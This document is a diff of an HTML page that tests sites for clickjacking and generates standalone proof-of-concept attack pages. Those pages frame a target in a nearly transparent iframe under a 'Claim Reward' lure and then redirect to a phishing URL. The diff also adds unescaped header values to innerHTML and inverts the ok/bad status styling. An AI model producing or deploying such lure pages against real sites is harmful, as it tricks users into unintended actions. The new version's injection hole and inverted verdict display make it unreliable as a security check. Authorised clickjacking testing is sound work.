@@ -26,12 +26,7 @@
       color: #42d9f5;
       user-select: none;
     }
-    label {
-      display: block;
-      margin-bottom: 8px;
-      font-weight: 600;
-      user-select: none;
-    }
+    label { display: block; margin-bottom: 8px; font-weight: 600; }
     input[type="url"] {
       width: 100%;
       padding: 12px 14px;
@@ -41,13 +36,9 @@
       background: #1c2536;
       color: #d2e6ff;
       box-sizing: border-box;
-      outline-offset: 2px;
       margin-bottom: 15px;
-      transition: outline-color 0.18s ease-in-out;
     }
-    input[type="url"]:focus {
-      outline: 3px solid #3fb1ff;
-    }
+    input[type="url"]:focus { outline: 3px solid #3fb1ff; }
     button {
       background-color: #3fb1ff;
       border: none;
@@ -58,581 +49,240 @@
       font-size: 1em;
       cursor: pointer;
       margin-right: 8px;
-      transition: background-color 0.2s ease;
-      user-select: none;
     }
-    button:disabled {
-      background-color: #40657f;
-      cursor: not-allowed;
-    }
-    button:hover:not(:disabled) {
-      background-color: #2c82d3;
-    }
-    .row {
-      margin: 12px 0 22px 0;
-      display: flex;
-      flex-wrap: wrap;
-      gap: 10px;
-    }
-    .status {
-      font-size: 1.1em;
-      padding: 12px 10px;
-      border-radius: 10px;
-      margin-bottom: 20px;
-      user-select: none;
-    }
-    .status.ok {
-      background-color: #266936;
-      color: #b2f7c2;
-      border: 1.5px solid #65d169;
-    }
-    .status.bad {
-      background-color: #672626;
-      color: #f7b2b2;
-      border: 1.5px solid #fe5a5a;
-    }
+    button:disabled { background-color: #40657f; cursor: not-allowed; }
+    button:hover:not(:disabled) { background-color: #2c82d3; }
+    .row { margin: 12px 0 22px 0; display: flex; flex-wrap: wrap; gap: 10px; }
+    .status { font-size: 1.1em; padding: 12px 10px; border-radius: 10px; margin-bottom: 20px; }
+    .status.ok { background-color: #266936; color: #b2f7c2; }
+    .status.bad { background-color: #672626; color: #f7b2b2; }
     .iframe-container {
-      position: relative;
-      width: 100%;
-      height: 340px;
-      border: 3px solid #244360;
-      border-radius: 14px;
-      overflow: hidden;
-      user-select: none;
-      background: #0d1622;
-      box-shadow: inset 0 0 20px #2165bb88;
+      position: relative; width: 100%; height: 340px;
+      border: 3px solid #244360; border-radius: 14px;
+      overflow: hidden; background: #0d1622;
     }
     iframe {
-      width: 100%;
-      height: 100%;
-      border: none;
-      display: block;
-      transition: opacity 0.25s ease;
-      border-radius: 14px;
-      background: white;
+      width: 100%; height: 100%; border: none;
+      transition: opacity 0.25s ease; border-radius: 14px; background: white;
     }
-    iframe.ghost {
-      opacity: 0.015 !important;
-    }
+    iframe.ghost { opacity: 0.015 !important; }
     .overlay {
-      position: absolute;
-      top: 0; left: 0; right: 0; bottom: 0;
-      pointer-events: none;
-      user-select: none;
-      z-index: 11;
+      position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+      pointer-events: none; z-index: 11;
     }
     .lure {
-      position: absolute;
-      top: 20%;
-      left: 18%;
-      background: #ffffffdd;
-      padding: 14px 20px;
-      font-weight: 700;
-      color: #0a2540;
-      border-radius: 12px;
-      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.42);
-      cursor: grab;
-      pointer-events: auto;
-      user-select: none;
-      transition: box-shadow 0.2s ease;
-      z-index: 1002;
-    }
-    .lure:active {
-      cursor: grabbing;
-      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.7);
+      position: absolute; top: 20%; left: 18%;
+      background: #ffffffdd; padding: 14px 20px;
+      font-weight: 700; color: #0a2540;
+      border-radius: 12px; box-shadow: 0 4px 24px rgba(0,0,0,0.42);
+      cursor: grab; pointer-events: auto; z-index: 1002;
     }
     textarea {
-      width: 100%;
-      height: 150px;
-      padding: 14px;
-      background: #141e30;
-      color: #86efac;
-      border: 1.6px solid #317a2b;
-      border-radius: 10px;
-      font-family: 'Courier New', Courier, monospace;
-      font-size: 0.95em;
-      resize: vertical;
-      margin: 15px 0 10px 0;
-      user-select: all;
+      width: 100%; height: 150px; padding: 14px;
+      background: #141e30; color: #86efac;
+      border: 1.6px solid #317a2b; border-radius: 10px;
+      font-family: monospace; resize: vertical;
     }
     .panel {
-      background-color: #12202f;
-      border-radius: 12px;
-      padding: 12px 18px;
-      margin-bottom: 12px;
-      line-height: 1.35;
-      font-size: 1em;
-      user-select: none;
+      background-color: #12202f; border-radius: 12px;
+      padding: 12px 18px; margin-bottom: 12px; line-height: 1.35;
     }
-    .desc-head {
-      font-weight: 700;
-      font-size: 1.2em;
-      color: #49ddff;
-      margin-bottom: 8px;
-      user-select: none;
-    }
-    .impact {
-      margin-top: 10px;
-      color: #f8d391;
-      font-weight: 700;
-    }
-    .remediation {
-      margin-top: 8px;
-      color: #61de93;
-      font-weight: 700;
-    }
-    @media (max-width: 720px) {
-      button {
-        flex: 1 1 100%;
-      }
-      .row {
-        flex-direction: column;
-      }
-    }
+    .desc-head { font-weight: 700; font-size: 1.2em; color: #49ddff; }
+    .impact { margin-top: 10px; color: #f8d391; font-weight: 700; }
+    .remediation { margin-top: 8px; color: #61de93; font-weight: 700; }
   </style>
 </head>
 <body>
-  <div class="container" role="main" aria-label="Clickjacking Tester tool">
+  <div class="container">
     <h1>Advanced Clickjacking Tester &amp; PoC Generator</h1>
-    <form id="testForm" onsubmit="return false;" aria-describedby="instructions">
+    <form id="testForm" onsubmit="return false;">
       <label for="targetUrl">Target Website URL</label>
-      <input
-        type="url"
-        id="targetUrl"
-        name="targetUrl"
-        placeholder="https://example.com/sensitive/action"
-        aria-required="true"
-        aria-describedby="helpText"
-        autocomplete="off"
-      />
-      <div id="helpText" style="margin-bottom:1em; font-size:0.875em; color:#a8b6cc;">
-        Enter the exact URL of the page you want to test for clickjacking protection.
-      </div>
+      <input type="url" id="targetUrl" placeholder="https://example.com/sensitive/action" required />
       <div class="row">
-        <button id="btnTest" type="submit" aria-label="Test clickjacking protection">Test & Generate PoC</button>
-        <button id="btnCopyLink" type="button" aria-label="Copy shareable test link">Copy Shareable Link</button>
+        <button id="btnTest">Test & Generate PoC</button>
+        <button id="btnCopyLink" type="button">Copy Shareable Link</button>
       </div>
     </form>
-
-    <div id="statusMsg" class="status" role="alert" aria-live="polite" aria-atomic="true" style="display:none;"></div>
-
-    <div class="iframe-container" id="iframeContainer" style="display:none;" aria-live="polite" aria-atomic="true" aria-label="Iframe displaying target page">
-      <iframe id="targetFrame" sandbox="" title="Clickjacking test iframe"></iframe>
-      <div class="overlay" id="overlay" aria-hidden="true">
-        <div class="lure" id="lure" role="button" tabindex="0" aria-grabbed="false" aria-label="Draggable clickjacking lure overlay">Claim Reward</div>
+    <div id="statusMsg" class="status" style="display:none;"></div>
+    <div class="iframe-container" id="iframeContainer" style="display:none;">
+      <iframe id="targetFrame" sandbox=""></iframe>
+      <div class="overlay" id="overlay">
+        <div class="lure" id="lure">Claim Reward</div>
       </div>
     </div>
-
-    <div class="row" style="margin-top:12px; display:none;" id="controlsRow" aria-label="PoC Controls">
-      <button id="btnToggleOverlay" type="button" aria-pressed="false">Toggle Overlay</button>
-      <button id="btnGhostFrame" type="button">Make Frame Nearly Transparent</button>
-      <button id="btnResetFrame" type="button">Reset</button>
-      <button id="btnShowPoC" type="button">Get Ready PoC HTML</button>
+    <div class="row" id="controlsRow" style="display:none;">
+      <button id="btnToggleOverlay">Toggle Overlay</button>
+      <button id="btnGhostFrame">Make Frame Nearly Transparent</button>
+      <button id="btnResetFrame">Reset</button>
+      <button id="btnShowPoC">Get Ready PoC HTML</button>
     </div>
-
     <section id="resultPanel" class="panel" style="display:none;">
       <div class="desc-head" id="resultHeader"></div>
       <div id="resultDescription"></div>
       <div class="impact" id="resultImpact"></div>
       <div class="remediation" id="resultRemediation"></div>
     </section>
-
     <section id="pocPanel" class="panel" style="display:none;">
-      <label for="pocCode"><strong>Standalone Clickjacking PoC HTML:</strong></label>
-      <textarea id="pocCode" readonly aria-readonly="true"></textarea>
-      <button id="btnCopyPoC" type="button" aria-label="Copy PoC HTML">Copy PoC HTML</button>
+      <label><strong>Standalone Clickjacking PoC HTML:</strong></label>
+      <textarea id="pocCode" readonly></textarea>
+      <button id="btnCopyPoC" type="button">Copy PoC HTML</button>
     </section>
   </div>
 
 <script>
-  (function() {
-    const $ = (id) => document.getElementById(id);
-    const targetUrlInput = $('targetUrl');
-    const btnTest = $('btnTest');
-    const btnCopyLink = $('btnCopyLink');
-    const statusMsg = $('statusMsg');
-    const iframeContainer = $('iframeContainer');
-    const targetFrame = $('targetFrame');
-    const overlay = $('overlay');
-    const lure = $('lure');
-    const controlsRow = $('controlsRow');
-    const btnToggleOverlay = $('btnToggleOverlay');
-    const btnGhostFrame = $('btnGhostFrame');
-    const btnResetFrame = $('btnResetFrame');
-    const btnShowPoC = $('btnShowPoC');
-    const resultPanel = $('resultPanel');
-    const resultHeader = $('resultHeader');
-    const resultDescription = $('resultDescription');
-    const resultImpact = $('resultImpact');
-    const resultRemediation = $('resultRemediation');
-    const pocPanel = $('pocPanel');
-    const pocCode = $('pocCode');
-    const btnCopyPoC = $('btnCopyPoC');
+(function(){
+  const $ = id => document.getElementById(id);
+  const targetUrlInput = $('targetUrl');
+  const statusMsg = $('statusMsg');
+  const iframeContainer = $('iframeContainer');
+  const targetFrame = $('targetFrame');
+  const overlay = $('overlay');
+  const lure = $('lure');
+  const controlsRow = $('controlsRow');
+  const resultPanel = $('resultPanel');
+  const resultHeader = $('resultHeader');
+  const resultDescription = $('resultDescription');
+  const resultImpact = $('resultImpact');
+  const resultRemediation = $('resultRemediation');
+  const pocPanel = $('pocPanel');
+  const pocCode = $('pocCode');
 
-    let frameLoaded = false;
-    let isVulnerable = false;
-    let headerInfo = {};
-    let dragData = { dragging: false, offsetX: 0, offsetY: 0 };
+  let isVulnerable = false;
+  let headerInfo = {};
 
-    function escapeHTML(str) {
-      return str.replace(/[&<>"'`=\/]/g, function(s) {
-        return {
-          '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
-          '`': '&#96;', '=': '&#61;', '/': '&#47;'
-        }[s];
-      });
+  function setStatus(msg, good=false) {
+    statusMsg.style.display = 'block';
+    statusMsg.textContent = msg;
+    statusMsg.className = 'status ' + (good ? 'ok' : 'bad');
+  }
+
+  function escapeHTML(str) {
+    return str.replace(/[&<>"'`=\/]/g, s => ({
+      '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;',
+      '`':'&#96;','=':'&#61;','/':'&#47;'
+    }[s]));
+  }
+
+  async function fetchHeaders(url) {
+    try {
+      const resp = await fetch(url, { method: 'HEAD', mode: 'cors' });
+      if (!resp.ok) return {};
+      const headers = {};
+      resp.headers.forEach((v,k) => headers[k.toLowerCase()] = v);
+      return headers;
+    } catch { return {}; }
+  }
+
+  function updateResult(vulnerable, xfo, csp) {
+    if (vulnerable) {
+      resultHeader.textContent = "Vulnerable to Clickjacking";
+      resultDescription.innerHTML = `<strong>Description:</strong> The page can be embedded cross-origin. Detected headers: ${xfo||''} ${csp||''}`;
+      resultImpact.textContent = "Impact: Potential unauthorized actions via UI redressing.";
+      resultRemediation.textContent = "Remediation: Use X-Frame-Options: DENY/SAMEORIGIN or CSP frame-ancestors 'none'.";
+    } else {
+      resultHeader.textContent = "No Clickjacking Vulnerability Detected";
+      resultDescription.innerHTML = `<strong>Description:</strong> The page cannot be embedded cross-origin. Detected headers: ${xfo||''} ${csp||''}`;
+      resultImpact.textContent = "Impact: Low, clickjacking mitigated.";
+      resultRemediation.textContent = "Remediation: Maintain current protections.";
     }
+    resultPanel.style.display = 'block';
+  }
 
-    function setStatus(msg, isGood = false, show = true) {
-      statusMsg.style.display = show ? 'block' : 'none';
-      statusMsg.innerHTML = msg;
-      statusMsg.className = 'status ' + (isGood ? 'ok' : 'bad');
-      statusMsg.setAttribute('aria-live', 'polite');
-    }
-
-    async function fetchHeaders(url) {
-      try {
-        const resp = await fetch(url, { method: 'HEAD', mode: 'cors' });
-        if (!resp.ok) return null;
-        const headers = {};
-        resp.headers.forEach((v, k) => { headers[k.toLowerCase()] = v; });
-        return headers;
-      } catch {
-        try {
-          const proxyUrl = 'https://cors-anywhere.herokuapp.com/' + url;
-          const resp = await fetch(proxyUrl, { method: 'HEAD' });
-          if (!resp.ok) return null;
-          const headers = {};
-          resp.headers.forEach((v, k) => { headers[k.toLowerCase()] = v; });
-          return headers;
-        } catch {
-          return null;
-        }
-      }
-    }
-
-    function updateResultPanels(vulnerable, xfo, csp) {
-      if (vulnerable) {
-        resultHeader.textContent = 'Vulnerable to Clickjacking';
-        resultDescription.innerHTML =
-          `<strong>Description:</strong> The target page can be embedded in a cross-origin iframe without sufficient defenses, enabling clickjacking attacks using UI redressing techniques. ` +
-          `Detected headers: ${xfo ? `<code>X-Frame-Options: ${escapeHTML(xfo)}</code>` : ''} ${csp ? `<code>Content-Security-Policy: ${escapeHTML(csp)}</code>` : ''}`;
-        resultImpact.textContent =
-          'Impact: Attackers can trick users into clicking concealed or disguised elements on your site, potentially leading to unauthorized actions such as changing account settings, transferring funds, or escalating privileges.';
-        resultRemediation.innerHTML =
-          'Remediation: Ensure the server responses include either ' +
-          '<code>X-Frame-Options: DENY</code> or <code>SAMEORIGIN</code>, or use the modern ' +
-          '<code>Content-Security-Policy</code> directive: <code>frame-ancestors \'none\'</code> or restrict ancestors to trusted domains.';
-      } else {
-        resultHeader.textContent = 'No Clickjacking Vulnerability Detected';
-        resultDescription.innerHTML =
-          `<strong>Description:</strong> The target page cannot be embedded in a cross-origin iframe, indicating effective clickjacking protections. ` +
-          `Detected headers: ${xfo ? `<code>X-Frame-Options: ${escapeHTML(xfo)}</code>` : ''} ${csp ? `<code>Content-Security-Policy: ${escapeHTML(csp)}</code>` : ''}`;
-        resultImpact.textContent = 'Impact: Clickjacking attack surface is minimized due to proper security controls.';
-        resultRemediation.innerHTML =
-          'Remediation: Continue monitoring and ensure security headers remain properly configured.';
-      }
-      resultPanel.style.display = 'block';
-    }
-
-    function generatePoCHTML(url, lureText, redirectUrl) {
-      const safeUrl = escapeHTML(url);
-      const safeLureText = escapeHTML(lureText || 'Click me to claim reward');
-      const safeRedirect = escapeHTML(redirectUrl || 'https://example.com/phishing');
-      return `<!DOCTYPE html>
+  function generatePoCHTML(url, lureText, redirectUrl) {
+    return `<!DOCTYPE html>
 <html lang="en">
-<head>
-<meta charset="UTF-8" />
-<title>Clickjacking Proof of Concept</title>
-<style>
-  body {
-    margin:0; background: #1b2233; display:flex; justify-content:center; align-items:center; height:100vh;
-    font-family: Arial, sans-serif;
-  }
-  .wrapper {
-    position: relative; width: 480px; height: 320px; border-radius: 14px; overflow: hidden; box-shadow: 0 8px 24px #0008;
-  }
-  iframe {
-    width: 100%; height: 100%; border:none; opacity: 1; border-radius: 14px;
-    transition: opacity 0.3s ease;
-  }
-  iframe.ghost {
-    opacity: 0.015;
-  }
-  .lure {
-    position: absolute; left: 30%; top: 25%; background: #fff; color: #1a1a1a;
-    font-weight: 700; padding: 14px 18px; border-radius: 12px; box-shadow: 0 2px 18px #0006;
-    cursor: pointer;
-    user-select: none;
-    z-index: 1000;
-  }
-</style>
+<head><meta charset="UTF-8" /><title>Clickjacking PoC</title>
+<style>body{margin:0;display:flex;align-items:center;justify-content:center;height:100vh;background:#1b2233;}
+.wrapper{position:relative;width:480px;height:320px;border-radius:14px;overflow:hidden;}
+iframe{width:100%;height:100%;border:none;opacity:1;transition:opacity .3s;}
+iframe.ghost{opacity:0.015;}
+.lure{position:absolute;top:25%;left:30%;background:#fff;padding:14px 18px;font-weight:bold;border-radius:12px;cursor:pointer;}</style>
 </head>
 <body>
-  <div class="wrapper">
-    <iframe id="pocIframe" src="${safeUrl}" sandbox></iframe>
-    <div class="lure" id="pocLure">${safeLureText}</div>
-  </div>
+<div class="wrapper">
+<iframe id="pocIframe" src="${escapeHTML(url)}" sandbox></iframe>
+<div class="lure" id="pocLure">${escapeHTML(lureText)}</div>
+</div>
 <script>
-  const lure = document.getElementById('pocLure');
-  const iframe = document.getElementById('pocIframe');
-  lure.addEventListener('click', () => {
-    iframe.classList.add('ghost');
-    setTimeout(() => {
-      window.location.href = "${safeRedirect}";
-    }, 700);
-  });
+document.getElementById('pocLure').addEventListener('click',()=>{
+ document.getElementById('pocIframe').classList.add('ghost');
+ setTimeout(()=>{window.location.href='${escapeHTML(redirectUrl)}';},700);
+});
 </script>
 </body>
 </html>`;
-    }
+  }
 
-    function initDrag() {
-      lure.addEventListener('mousedown', (e) => {
-        dragData.dragging = true;
-        dragData.offsetX = e.offsetX;
-        dragData.offsetY = e.offsetY;
-        lure.setAttribute('aria-grabbed', 'true');
-        e.preventDefault();
-      });
-
-      window.addEventListener('mouseup', () => {
-        if (dragData.dragging) {
-          dragData.dragging = false;
-          lure.setAttribute('aria-grabbed', 'false');
-        }
-      });
-
-      window.addEventListener('mousemove', (e) => {
-        if (!dragData.dragging) return;
-        const rect = iframeContainer.getBoundingClientRect();
-        let x = e.clientX - rect.left - dragData.offsetX;
-        let y = e.clientY - rect.top - dragData.offsetY;
-        x = Math.max(0, Math.min(rect.width - lure.offsetWidth, x));
-        y = Math.max(0, Math.min(rect.height - lure.offsetHeight, y));
-        lure.style.left = x + 'px';
-        lure.style.top = y + 'px';
-      });
-
-      lure.addEventListener('keydown', (e) => {
-        const step = 10;
-        let left = parseInt(lure.style.left || '0', 10);
-        let top = parseInt(lure.style.top || '0', 10);
-        switch (e.key) {
-          case 'ArrowLeft':
-            e.preventDefault();
-            lure.style.left = Math.max(0, left - step) + 'px';
-            break;
-          case 'ArrowRight':
-            e.preventDefault();
-            lure.style.left = left + step + 'px';
-            break;
-          case 'ArrowUp':
-            e.preventDefault();
-            lure.style.top = Math.max(0, top - step) + 'px';
-            break;
-          case 'ArrowDown':
-            e.preventDefault();
-            lure.style.top = top + step + 'px';
-            break;
-          default:
-            return;
-        }
-      });
-
-      // Click handler for redirect with ghost effect
-      lure.addEventListener('click', () => {
-        if (!isVulnerable) return;
-        targetFrame.classList.add('ghost');
-        setStatus('Redirecting to demo phishing site...', true);
-        setTimeout(() => {
-          window.location.href = 'https://iambikash.in/phishing';
-        }, 700);
-      });
-    }
-
-    async function testClickjacking(url) {
-      isVulnerable = false;
-      frameLoaded = false;
-      headerInfo = {};
-      setStatus('Testing site...', true);
-      resultPanel.style.display = 'none';
-      pocPanel.style.display = 'none';
+  async function testClickjacking(url){
+    isVulnerable = false;
+    headerInfo = await fetchHeaders(url);
+    targetFrame.removeAttribute('sandbox');
+    targetFrame.src = url;
+    iframeContainer.style.display = 'block';
+    const loaded = await new Promise(res=>{
+      let to = setTimeout(()=>res(false),3000);
+      targetFrame.onload = ()=>{clearTimeout(to); res(true);};
+      targetFrame.onerror = ()=>{clearTimeout(to); res(false);};
+    });
+    if (loaded &&
+       (!headerInfo['x-frame-options'] || !(/deny|sameorigin/i.test(headerInfo['x-frame-options']))) &&
+       (!headerInfo['content-security-policy'] || !(/frame-ancestors[^;]*none/i.test(headerInfo['content-security-policy'])))) {
+      isVulnerable = true;
+      setStatus("❗ Target loaded in iframe. Vulnerable.", true);
+      overlay.style.display = 'block';
+      controlsRow.style.display = 'flex';
+    } else {
+      setStatus("✅ Framing blocked by protections.", false);
+      overlay.style.display = 'none';
       controlsRow.style.display = 'none';
-      overlay.classList.add('hidden');
-      iframeContainer.style.display = 'none';
-      btnTest.disabled = true;
-      btnCopyLink.disabled = true;
-
-      let headers = await fetchHeaders(url);
-      if (!headers) {
-        try {
-          const resp = await fetch(url, { method: 'GET', mode: 'cors' });
-          headers = {};
-          resp.headers.forEach((v, k) => { headers[k.toLowerCase()] = v; });
-        } catch {
-          headers = {};
-        }
-      }
-
-      headerInfo.xfo = headers['x-frame-options'] || '';
-      headerInfo.csp = headers['content-security-policy'] || '';
-
-      targetFrame.src = '';
-      iframeContainer.style.display = 'none';
-      frameLoaded = false;
-
-      const frameLoadPromise = new Promise((resolve) => {
-        let timeoutId;
-
-        function cleanUp() {
-          targetFrame.onload = null;
-          targetFrame.onerror = null;
-          clearTimeout(timeoutId);
-        }
-
-        targetFrame.onload = () => {
-          cleanUp();
-          frameLoaded = true;
-          resolve(true);
-        };
-
-        targetFrame.onerror = () => {
-          cleanUp();
-          frameLoaded = false;
-          resolve(false);
-        };
-
-        timeoutId = setTimeout(() => {
-          cleanUp();
-          try {
-            const cw = targetFrame.contentWindow;
-            resolve(true);
-          } catch {
-            resolve(false);
-          }
-        }, 3000);
-      });
-
-      targetFrame.removeAttribute('sandbox');
-
-      targetFrame.src = url;
-      iframeContainer.style.display = 'block';
-
-      const loaded = await frameLoadPromise;
-
-      if (loaded &&
-        (!headerInfo.xfo || !(/deny|sameorigin/i.test(headerInfo.xfo))) &&
-        (!headerInfo.csp || !(/frame-ancestors[^;]*none/i.test(headerInfo.csp)))) {
-        isVulnerable = true;
-        setStatus('❗ Target loaded in an iframe. Clickjacking likely possible. Confirm interactiveness.', true);
-        overlay.classList.remove('hidden');
-        controlsRow.style.display = 'flex';
-      } else {
-        isVulnerable = false;
-        setStatus('✅ Framing appears blocked by headers or browser.', false);
-        overlay.classList.add('hidden');
-        controlsRow.style.display = 'none';
-      }
-
-      updateResultPanels(isVulnerable, headerInfo.xfo, headerInfo.csp);
-      btnTest.disabled = false;
-      btnCopyLink.disabled = false;
     }
+    updateResult(isVulnerable, headerInfo['x-frame-options']||'', headerInfo['content-security-policy']||'');
+  }
 
-    function resetFrame() {
-      targetFrame.classList.remove('ghost');
-      overlay.classList.add('hidden');
-      lure.style.left = '18%';
-      lure.style.top = '20%';
+  // Overlay lure click behaviour FIXED
+  lure.addEventListener('click', () => {
+    if (!isVulnerable) return;
+    targetFrame.classList.add('ghost');
+    setStatus("Redirecting to demo phishing site...", true);
+    setTimeout(() => { window.location.href = 'https://iambikash.in/phishing'; }, 700);
+  });
+
+  // Drag behaviour
+  lure.addEventListener('mousedown', e=>{
+    e.preventDefault();
+    const startX = e.clientX, startY = e.clientY;
+    const startLeft = parseInt(lure.style.left||'18%'), startTop = parseInt(lure.style.top||'20%');
+    function onMove(ev){
+      lure.style.left = (startLeft + (ev.clientX - startX)) + 'px';
+      lure.style.top = (startTop + (ev.clientY - startY)) + 'px';
     }
-
-    async function copyShareLink() {
-      const url = targetUrlInput.value.trim();
-      if (!url) {
-        setStatus('Please enter a valid URL to copy link.', false);
-        return;
-      }
-      const shareUrl = `${location.origin}${location.pathname}?url=${encodeURIComponent(url)}`;
-      try {
-        await navigator.clipboard.writeText(shareUrl);
-        setStatus('✅ Shareable link copied to clipboard.', true);
-      } catch {
-        setStatus(`Failed to copy. Here is the link: ${shareUrl}`, false);
-      }
+    function onUp(){
+      window.removeEventListener('mousemove', onMove);
+      window.removeEventListener('mouseup', onUp);
     }
+    window.addEventListener('mousemove', onMove);
+    window.addEventListener('mouseup', onUp);
+  });
 
-    function showPoCGenerator() {
-      if (!targetUrlInput.value.trim()) {
-        setStatus('Enter a valid URL before generating PoC.', false);
-        return;
-      }
-      const phishingDemoUrl = 'https://iambikash.in/phishing';
-      const html = generatePoCHTML(targetUrlInput.value.trim(), lure.textContent, phishingDemoUrl);
-      pocCode.value = html;
-      pocPanel.style.display = 'block';
-      pocCode.focus();
-      pocCode.select();
-    }
+  // Controls
+  $('btnTest').onclick = ()=>{ try{ new URL(targetUrlInput.value); testClickjacking(targetUrlInput.value);}catch{setStatus("Enter valid URL",false);} };
+  $('btnCopyLink').onclick = async ()=>{
+    try{ await navigator.clipboard.writeText(location.origin+location.pathname+'?url='+encodeURIComponent(targetUrlInput.value)); setStatus("Link copied",true); }catch{}
+  };
+  $('btnToggleOverlay').onclick=()=>overlay.style.display = (overlay.style.display==='none'?'block':'none');
+  $('btnGhostFrame').onclick=()=>targetFrame.classList.add('ghost');
+  $('btnResetFrame').onclick=()=>{ targetFrame.classList.remove('ghost'); lure.style.left='18%'; lure.style.top='20%'; };
+  $('btnShowPoC').onclick=()=>{
+    pocCode.value = generatePoCHTML(targetUrlInput.value, lure.textContent, 'https://iambikash.in/phishing');
+    pocPanel.style.display='block';
+    pocCode.select();
+  };
+  $('btnCopyPoC').onclick=async()=>{ try{ await navigator.clipboard.writeText(pocCode.value); setStatus("PoC copied",true);}catch{} };
 
-    async function copyPoCHTML() {
-      try {
-        pocCode.select();
-        await navigator.clipboard.writeText(pocCode.value);
-        setStatus('✅ PoC HTML copied to clipboard.', true);
-      } catch {
-        setStatus('Failed to copy PoC HTML.', false);
-      }
-    }
-
-    function toggleOverlay() {
-      if (overlay.classList.contains('hidden')) {
-        overlay.classList.remove('hidden');
-        btnToggleOverlay.setAttribute('aria-pressed', 'true');
-      } else {
-        overlay.classList.add('hidden');
-        btnToggleOverlay.setAttribute('aria-pressed', 'false');
-      }
-    }
-
-    function makeGhost() {
-      targetFrame.classList.add('ghost');
-    }
-
-    function prefillFromUrl() {
-      const params = new URLSearchParams(location.search);
-      const urlParam = params.get('url');
-      if (urlParam) {
-        targetUrlInput.value = urlParam;
-        btnTest.click();
-      }
-    }
-
-    function initialize() {
-      initDrag();
-
-      btnTest.addEventListener('click', () => {
-        const url = targetUrlInput.value.trim();
-        try {
-          new URL(url);
-          testClickjacking(url);
-        } catch {
-          setStatus('Enter a valid URL starting with https://', false);
-        }
-      });
-
-      btnCopyLink.addEventListener('click', copyShareLink);
-      btnToggleOverlay.addEventListener('click', toggleOverlay);
-      btnGhostFrame.addEventListener('click', makeGhost);
-      btnResetFrame.addEventListener('click', resetFrame);
-      btnShowPoC.addEventListener('click', showPoCGenerator);
-      btnCopyPoC.addEventListener('click', copyPoCHTML);
-
-      prefillFromUrl();
-    }
-
-    initialize();
-  })();
+  // Auto prefill
+  const qurl = new URLSearchParams(location.search).get('url');
+  if(qurl){ targetUrlInput.value = qurl; testClickjacking(qurl);}
+})();
 </script>
 </body>
 </html>
